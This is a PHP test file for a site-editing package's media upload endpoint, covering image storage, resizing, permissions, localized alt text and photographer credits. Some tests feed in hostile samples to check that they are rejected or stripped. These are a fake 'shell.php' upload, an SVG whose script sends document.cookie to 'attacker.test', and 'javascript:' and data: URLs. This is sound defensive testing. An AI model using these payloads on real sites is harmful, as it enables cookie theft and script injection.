<?php

namespace ShipFast\LiveEdit\Tests\Api;

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use ShipFast\LiveEdit\Domain\Content\ImageStore;
use ShipFast\LiveEdit\Domain\Content\SiteStore;
use ShipFast\LiveEdit\Domain\Site\Ability;
use ShipFast\LiveEdit\Domain\Site\Site;
use ShipFast\LiveEdit\Domain\Site\TokenType;
use ShipFast\LiveEdit\Mapper\MarkupScanner;
use ShipFast\LiveEdit\Tests\Fixtures\RemoteLikeDisk;
use ShipFast\LiveEdit\Tests\TestCase;

class MediaTest extends TestCase
{
    protected Site $site;

    protected string $session;

    protected string $publishable;

    protected function defineEnvironment($app): void
    {
        parent::defineEnvironment($app);

        $app['config']->set('live-edit.api', [
            'enabled' => true,
            'prefix' => 'api/live-edit/v1',
            'session_ttl' => 1800,
            'throttle' => [
                'read' => ['burst' => ['max' => 120, 'seconds' => 60], 'sustained' => ['max' => 3000, 'seconds' => 3600]],
                'write' => ['burst' => ['max' => 40, 'seconds' => 60], 'sustained' => ['max' => 600, 'seconds' => 3600]],
                'session' => ['burst' => ['max' => 10, 'seconds' => 60], 'sustained' => ['max' => 120, 'seconds' => 3600]],
                'publish' => ['burst' => ['max' => 6, 'seconds' => 60], 'sustained' => ['max' => 60, 'seconds' => 3600]],
                'upload' => ['burst' => ['max' => 3, 'seconds' => 60], 'sustained' => ['max' => 10, 'seconds' => 3600]],
            ],
            'cache' => ['pointer_seconds' => 30, 'version_seconds' => 31536000, 'stale_while_revalidate' => 86400],
        ]);
        $app['config']->set('cors.paths', []);

        // The bucket, which is what a real deployment uses.
        $app['config']->set('live-edit.disk', 's3');
        $app['config']->set('live-edit.directory', 'live-edit');
        $app['config']->set('live-edit.max_upload_kb', 8192);
        $app['config']->set('live-edit.settings', ['heroImage', 'heroImageAlt', 'heroImageTitle']);
    }

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('s3');

        // Answering path() with a key, as a bucket does. Without this the
        // fake is a local directory and the bug being guarded against here
        // cannot show itself.
        Storage::set('s3', new RemoteLikeDisk(Storage::disk('s3')));

        $this->site = Site::query()->create([
            'slug' => 'client',
            'name' => 'Client',
            'allowed_origins' => ['https://client.test'],
        ]);

        [, $this->session] = $this->site->issueToken(TokenType::Session, 'Edit', [Ability::Read, Ability::Write], now()->addHour());
        [, $this->publishable] = $this->site->issueToken(TokenType::Publishable, 'Web');
    }

    protected function url(): string
    {
        return '/api/live-edit/v1/client/media';
    }

    protected function as(string $token): array
    {
        // What the editor itself sends. Without it a rejected field is a
        // redirect rather than the error the browser would actually see.
        return [
            'Authorization' => 'Bearer '.$token,
            'Origin' => 'https://client.test',
            'Accept' => 'application/json',
        ];
    }

    public function test_an_image_is_stored_on_the_bucket_and_answered_with_a_url(): void
    {
        $response = $this->post($this->url(), ['file' => UploadedFile::fake()->image('hero.jpg', 800, 600)], $this->as($this->session));

        $response->assertOk()->assertJsonStructure(['url', 'path']);

        $path = $response->json('path');
        Storage::disk('s3')->assertExists($path);
        $this->assertStringStartsWith('live-edit/', $path);

        // A URL is what a page fetches; a key is what the disk is asked for.
        // The stored value must be the key.
        $this->assertStringNotContainsString('http', $path);
    }

    public function test_an_image_is_fitted_before_it_reaches_the_bucket(): void
    {
        // The bug this guards: the fitter needs a real file, and on a remote
        // disk a stored path is a key. Fitting after storing silently did
        // nothing and the picture arrived at its original size.
        if (! extension_loaded('gd')) {
            $this->markTestSkipped('GD is not available.');
        }

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->image('wide.jpg', 1600, 400),
            'fitWidth' => 400,
            'fitHeight' => 400,
        ], $this->as($this->session));

        $response->assertOk();

        $stored = Storage::disk('s3')->get($response->json('path'));
        $size = getimagesizefromstring($stored);

        $this->assertSame([400, 400], [$size[0], $size[1]], 'the image reached the bucket unfitted');
    }

    public function test_a_big_enough_photograph_is_kept_sharp_for_a_retina_screen(): void
    {
        // The box is measured in the browser in CSS pixels, and the screens
        // that matter draw two device pixels for each one. Fitted to the box
        // exactly, every replacement looked soft beside the template's own
        // photographs, which were not.
        if (! extension_loaded('gd')) {
            $this->markTestSkipped('GD is not available.');
        }

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->image('photo.jpg', 2400, 1600),
            'fitWidth' => 400,
            'fitHeight' => 300,
        ], $this->as($this->session));

        $response->assertOk();

        $size = getimagesizefromstring(Storage::disk('s3')->get($response->json('path')));

        $this->assertSame([800, 600], [$size[0], $size[1]], 'the box was filled at one pixel per CSS pixel');
    }

    public function test_a_small_photograph_is_never_enlarged_to_fill_the_box(): void
    {
        // Invented detail, paid for in bandwidth, and worse looking than the
        // honest smaller file the browser would have scaled itself. The shape
        // still has to be the box's, or the layout goes.
        if (! extension_loaded('gd')) {
            $this->markTestSkipped('GD is not available.');
        }

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->image('small.jpg', 500, 500),
            'fitWidth' => 400,
            'fitHeight' => 300,
        ], $this->as($this->session));

        $response->assertOk();

        $size = getimagesizefromstring(Storage::disk('s3')->get($response->json('path')));

        // 500 wide is 1.25 boxes, so that is all the density available.
        $this->assertSame([500, 375], [$size[0], $size[1]]);
    }

    public function test_a_publishable_key_cannot_upload(): void
    {
        $this->post($this->url(), ['file' => UploadedFile::fake()->image('x.jpg')], $this->as($this->publishable))
            ->assertStatus(403);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_upload_from_an_unlisted_origin_is_refused(): void
    {
        $this->post($this->url(), ['file' => UploadedFile::fake()->image('x.jpg')], [
            'Authorization' => 'Bearer '.$this->session,
            'Origin' => 'https://attacker.test',
        ])->assertStatus(403);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_a_disguised_file_is_refused(): void
    {
        // A .php that claims to be an image must not reach a bucket that may
        // be served by something willing to execute it.
        $this->post($this->url(), ['file' => UploadedFile::fake()->create('shell.php', 10, 'image/jpeg')], $this->as($this->session))
            ->assertStatus(422);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_oversized_image_is_refused(): void
    {
        config()->set('live-edit.max_upload_kb', 100);

        $this->post($this->url(), ['file' => UploadedFile::fake()->create('huge.jpg', 500, 'image/jpeg')], $this->as($this->session))
            ->assertStatus(422);

        $this->assertSame([], Storage::disk('s3')->allFiles());
    }

    public function test_an_svg_is_rebuilt_before_it_is_stored(): void
    {
        // An SVG is a document, not a picture. Served straight from a CDN it
        // is never passed through anything again, so it has to be safe as it
        // goes in.
        $hostile = <<<'SVG'
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
            <script>fetch('https://attacker.test/'+document.cookie)</script>
            <circle cx="5" cy="5" r="4" onload="alert(1)"/>
            <image href="https://attacker.test/pixel.png"/>
        </svg>
        SVG;

        $response = $this->post($this->url(), [
            'file' => UploadedFile::fake()->createWithContent('logo.svg', $hostile),
        ], $this->as($this->session));

        $response->assertOk();

        $stored = Storage::disk('s3')->get($response->json('path'));

        $this->assertStringNotContainsString('<script', $stored);
        $this->assertStringNotContainsString('onload', $stored);
        $this->assertStringNotContainsString('attacker.test', $stored);
        $this->assertStringContainsString('circle', $stored, 'the drawing itself should survive');
        $this->assertStringContainsString('viewBox', $stored, 'and so should its case-sensitive attributes');
    }

    public function test_uploads_are_throttled_harder_than_text(): void
    {
        for ($i = 0; $i < 3; $i++) {
            $this->post($this->url(), ['file' => UploadedFile::fake()->image("a{$i}.jpg")], $this->as($this->session))->assertOk();
        }

        $this->post($this->url(), ['file' => UploadedFile::fake()->image('b.jpg')], $this->as($this->session))
            ->assertStatus(429);
    }

    public function test_two_sites_keep_their_pictures_apart(): void
    {
        $other = Site::query()->create(['slug' => 'other', 'name' => 'Other', 'allowed_origins' => ['https://other.test']]);
        [, $theirSession] = $other->issueToken(TokenType::Session, 'Edit', [Ability::Read, Ability::Write], now()->addHour());

        $ours = $this->post($this->url(), ['file' => UploadedFile::fake()->image('a.jpg')], $this->as($this->session))
            ->assertOk()->json('path');

        $theirs = $this->post('/api/live-edit/v1/other/media', ['file' => UploadedFile::fake()->image('b.jpg')],
            ['Authorization' => 'Bearer '.$theirSession, 'Origin' => 'https://other.test'])
            ->assertOk()->json('path');

        $this->assertStringContainsString('/sites/client/', $ours);
        $this->assertStringContainsString('/sites/other/', $theirs);
    }

    public function test_images_are_addressed_through_the_cdn_when_one_is_configured(): void
    {
        // The reason for the bucket: served from an edge near the visitor,
        // never from this application.
        config()->set('live-edit.media_url', 'https://cdn.client.test');

        $response = $this->post($this->url(), ['file' => UploadedFile::fake()->image('hero.jpg')], $this->as($this->session));

        $this->assertSame(
            'https://cdn.client.test/'.$response->json('path'),
            $response->json('url')
        );
    }

    public function test_the_stored_path_is_never_the_cdn_url(): void
    {
        // The trap: a URL stored where a key belongs works until the first
        // caller that needs a key.
        config()->set('live-edit.media_url', 'https://cdn.client.test');

        $path = (new ImageStore)->store(UploadedFile::fake()->image('hero.jpg'));

        $this->assertStringNotContainsString('cdn.client.test', $path);
        Storage::disk('s3')->assertExists($path);
    }

    public function test_the_editor_and_the_api_store_images_the_same_way(): void
    {
        // One store, so a picture uploaded in the page and one uploaded over
        // HTTP cannot end up in different places or at different sizes.
        $path = (new ImageStore)->store(UploadedFile::fake()->image('direct.jpg', 100, 100));

        Storage::disk('s3')->assertExists($path);
        $this->assertStringStartsWith('live-edit/', $path);
    }

    /* ------------ changing the picture a page actually points at ------------ */

    /**
     * Storing the bytes was never the job. This endpoint took an upload, put
     * it in the bucket, handed back an address and left it there — nobody
     * wrote the address down, so the page went on showing the old picture. A
     * customer sees a save that did nothing.
     */
    public function test_an_uploaded_picture_becomes_the_one_the_page_shows(): void
    {
        $response = $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'file' => UploadedFile::fake()->image('new.jpg', 800, 600),
        ], $this->as($this->session))->assertOk();

        $this->assertSame($response->json('url'), $this->settings()['heroImage'] ?? null);
    }

    public function test_a_pasted_url_becomes_the_picture(): void
    {
        // The drawer offers "or paste an image URL" and this endpoint used to
        // reject it outright: the only field it read was the file, so pasting
        // a URL answered "the file field is required".
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->session))->assertOk();

        $this->assertSame('https://images.example.com/beach.jpg', $this->settings()['heroImage'] ?? null);
    }

    public function test_a_picture_can_be_described_and_removed(): void
    {
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
            'alt' => 'A beach at dawn',
            'imgTitle' => 'Dawn',
        ], $this->as($this->session))->assertOk();

        $settings = $this->settings();
        $this->assertSame('A beach at dawn', $settings['heroImageAlt'] ?? null);
        $this->assertSame('Dawn', $settings['heroImageTitle'] ?? null);

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'remove' => '1',
        ], $this->as($this->session))->assertOk();

        $this->assertSame('', $this->settings()['heroImage'] ?? null);
    }

    public function test_a_disk_that_refuses_the_write_is_an_answer_not_a_500(): void
    {
        /*
         * What a client actually saw: a failed request with the body
         * {"message":"Server Error"}, twice, and nothing to act on. Every
         * other refusal in this codebase says what happened and this one route
         * did not - the one route whose work leaves the database and touches a
         * filesystem, which is where hosts differ most.
         *
         * Reported as well as answered, so it still reaches the log. The
         * message is for the person holding the mouse; the log line is for us.
         */
        config()->set('live-edit.disk', 'nowhere-at-all');

        $response = $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'file' => UploadedFile::fake()->image('beach.jpg', 800, 600),
        ], $this->as($this->session));

        $response->assertStatus(500);
        $this->assertSame('storage_error', $response->json('error.type'));
        $this->assertStringContainsString('could not be stored', (string) $response->json('error.message'));
        // And it says the page is untouched, because the first thing somebody
        // wonders is whether they have half-broken their own site.
        $this->assertStringContainsString('Nothing on the page has changed', (string) $response->json('error.message'));
    }

    public function test_a_description_is_written_in_the_language_it_was_typed_in(): void
    {
        /*
         * Alt text is the one part of a page whose whole job is to be read
         * aloud, and it was stored once for every language. A French page read
         * its description in English to whoever most needed it not to be.
         *
         * Only the description. The picture is the same picture in every
         * language and the photographer is the same photographer, so those
         * stay at the canonical key - one address to keep current, one credit
         * that cannot drift out of step with itself.
         */
        $this->site->forceFill(['locales' => ['en' => 'English', 'fr' => 'French']])->save();

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
            'alt' => 'A beach at dawn',
            'credit' => 'Photo by Caio Silva',
        ], $this->as($this->session))->assertOk();

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'alt' => 'Une plage à l\'aube',
            'locale' => 'fr',
        ], $this->as($this->session))->assertOk();

        // Read the way a page is read, per language, rather than by looking
        // for a key: which row a locale is stored in is this store's business
        // and a test asserting the spelling would pass while the page served
        // nothing.
        $store = new SiteStore($this->site->fresh());
        $french = $store->published('fr');
        $english = $store->published('en');

        $this->assertSame('Une plage à l\'aube', $french['heroImageAlt'] ?? null);
        $this->assertSame('A beach at dawn', $english['heroImageAlt'] ?? null, 'the English description was overwritten by the French');

        // The picture and the photographer are the same in both, from one row
        // each. One address to keep current, one credit that cannot drift out
        // of step with itself.
        $this->assertSame('https://images.example.com/beach.jpg', $french['heroImage'] ?? null);
        $this->assertSame($english['heroImage'] ?? null, $french['heroImage'] ?? null);
        $this->assertSame($english['heroImageCredit'] ?? null, $french['heroImageCredit'] ?? null);
    }

    public function test_a_language_the_site_does_not_speak_is_refused(): void
    {
        // The same rule a text save follows. A locale nobody declared files
        // the value under a prefix no page ever reads, and nothing says so.
        $this->site->forceFill(['locales' => ['en' => 'English']])->save();

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'alt' => 'Une plage',
            'locale' => 'fr',
        ], $this->as($this->session))->assertStatus(422);
    }

    public function test_the_alt_text_can_be_changed_on_its_own(): void
    {
        // Correcting a description is a real edit, and the picture field being
        // empty while doing it is not a mistake.
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->session))->assertOk();

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'alt' => 'Corrected description',
        ], $this->as($this->session))->assertOk();

        $settings = $this->settings();
        $this->assertSame('Corrected description', $settings['heroImageAlt'] ?? null);
        // And the picture it describes is still there.
        $this->assertSame('https://images.example.com/beach.jpg', $settings['heroImage'] ?? null);
    }

    public function test_a_description_is_saved_for_a_picture_nobody_declared(): void
    {
        // The scanner names a picture auto:<hash>; its description is that
        // name with a suffix, which matches no allowlist and no pattern.
        // Refusing it failed the save *after* the picture had been replaced,
        // so the change had happened and the person was told it had not.
        config()->set('live-edit.auto_keys', true);

        $this->post($this->url(), [
            'target' => 'setting:auto:1a2b3c4d5e6f',
            'url' => 'https://images.example.com/beach.jpg',
            'alt' => 'A beach at dawn',
        ], $this->as($this->session))->assertOk();

        $settings = $this->settings();
        $this->assertSame('https://images.example.com/beach.jpg', $settings['auto:1a2b3c4d5e6f'] ?? null);
        $this->assertSame('A beach at dawn', $settings['auto:1a2b3c4d5e6fAlt'] ?? null);
    }

    public function test_a_companion_key_is_only_allowed_beside_a_real_one(): void
    {
        // Not a general escape from the allowlist: the suffix is permitted
        // because the thing it describes is, and for nothing else.
        config()->set('live-edit.auto_keys', false);

        $this->post($this->url(), [
            'target' => 'setting:whateverAlt',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->session))->assertStatus(422);
    }

    public function test_a_refused_save_leaves_nothing_behind(): void
    {
        // One picture edit is several settings. Written one at a time, a
        // refusal partway through replaced the picture and kept the old
        // description, while reporting that nothing had been saved.
        config()->set('live-edit.auto_keys', true);

        // Room for exactly one write, so the picture is stored and the
        // description that follows it is refused — a failure that can only
        // happen partway through, which is the case this is about.
        $this->site->forceFill(['limits' => ['writes' => 1]])->save();

        $this->post($this->url(), [
            'target' => 'setting:auto:1a2b3c4d5e6f',
            'url' => 'https://images.example.com/beach.jpg',
            'alt' => 'A beach at dawn',
        ], $this->as($this->session))->assertStatus(402);

        $settings = $this->settings();
        $this->assertArrayNotHasKey('auto:1a2b3c4d5e6f', $settings, 'the picture changed on a save that failed');
        $this->assertArrayNotHasKey('auto:1a2b3c4d5e6fAlt', $settings);
    }

    public function test_a_save_with_nothing_in_it_says_so(): void
    {
        $this->post($this->url(), ['target' => 'setting:heroImage'], $this->as($this->session))
            ->assertStatus(422)
            ->assertJsonPath('error.type', 'invalid_request_error');
    }

    public function test_a_picture_may_not_be_a_script(): void
    {
        // This value becomes a src the browser will fetch.
        foreach (['javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD4='] as $attempt) {
            $this->post($this->url(), ['target' => 'setting:heroImage', 'url' => $attempt], $this->as($this->session))
                ->assertStatus(422);

            $this->assertArrayNotHasKey('heroImage', $this->settings());
        }
    }

    public function test_an_undeclared_setting_is_refused(): void
    {
        // The same allowlist a text edit goes through: an API that wrote any
        // key it was handed would be a way around it.
        $this->post($this->url(), [
            'target' => 'setting:somethingElse',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->session))->assertStatus(422);
    }

    public function test_a_row_in_the_hosts_own_database_is_not_reachable(): void
    {
        // "post:12" is a record in the host application. A site on somebody
        // else's server has none, and this API does not reach into one.
        $this->post($this->url(), [
            'target' => 'post:12',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->session))->assertStatus(422);
    }

    public function test_a_read_only_key_cannot_change_a_picture(): void
    {
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
        ], $this->as($this->publishable))->assertStatus(403);

        $this->assertArrayNotHasKey('heroImage', $this->settings());
    }

    public function test_an_upload_with_no_target_still_answers_with_an_address(): void
    {
        // A style field uploading a section background writes the address into
        // the style itself, so it names no setting. That path must keep
        // working exactly as it did.
        $this->post($this->url(), ['file' => UploadedFile::fake()->image('bg.jpg')], $this->as($this->session))
            ->assertOk()
            ->assertJsonStructure(['url', 'path']);
    }

    /**
     * What the person editing would see: their own unpublished work laid over
     * what is live, which is the same thing the content endpoint hands them.
     *
     * @return array<string, string>
     */
    protected function settings(): array
    {
        $store = new SiteStore($this->site->fresh());

        return array_merge($store->published(), $store->draftedSettings());
    }

    public function test_the_photographer_is_kept_with_the_picture(): void
    {
        // Unsplash's terms and every Creative Commons licence but CC0 require
        // the photographer to be named where the work appears. It used to
        // live in the tooltip, visible on hover and nowhere else, which meets
        // no licence anywhere and left the obligation with us.
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
            'credit' => 'Photo by Jefferson Santos on Unsplash',
            'creditBy' => 'Jefferson Santos',
            'creditUrl' => 'https://unsplash.com/@jefflssantos?utm_medium=referral',
            'creditSource' => 'Unsplash',
            'creditSourceUrl' => 'https://unsplash.com?utm_medium=referral',
        ], $this->as($this->session))->assertOk();

        $held = (new SiteStore($this->site->fresh()))->published();

        $this->assertSame('Photo by Jefferson Santos on Unsplash', $held['heroImageCredit'] ?? null);
        $this->assertSame('Jefferson Santos', $held['heroImageCreditBy'] ?? null);
        $this->assertSame('Unsplash', $held['heroImageCreditSource'] ?? null);
    }

    public function test_a_new_picture_does_not_keep_the_last_photographers_name(): void
    {
        // The worst version of this: somebody else's name under a photograph
        // they did not take. That is a false statement about authorship, and
        // it would be one we made on the client's behalf.
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/first.jpg',
            'credit' => 'Photo by Jefferson Santos on Unsplash',
            'creditBy' => 'Jefferson Santos',
        ], $this->as($this->session))->assertOk();

        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/second.jpg',
        ], $this->as($this->session))->assertOk();

        $held = (new SiteStore($this->site->fresh()))->published();

        $this->assertSame('', $held['heroImageCredit'] ?? '');
        $this->assertSame('', $held['heroImageCreditBy'] ?? '');
    }

    public function test_the_credit_is_written_onto_the_picture_in_the_page(): void
    {
        // A page a server renders has to carry the credit itself; knowing it
        // in a database names nobody.
        $this->post($this->url(), [
            'target' => 'setting:heroImage',
            'url' => 'https://images.example.com/beach.jpg',
            'credit' => 'Photo by Jefferson Santos on Unsplash',
            'creditBy' => 'Jefferson Santos',
        ], $this->as($this->session))->assertOk();

        $marked = (new MarkupScanner)->applyOverrides(
            '<img data-edit-img="setting:heroImage" src="old.jpg">',
            (new SiteStore($this->site->fresh()))->published(),
        );

        $this->assertStringContainsString('data-edit-credit="Photo by Jefferson Santos on Unsplash"', $marked);
        $this->assertStringContainsString('data-edit-credit-by="Jefferson Santos"', $marked);
    }
}
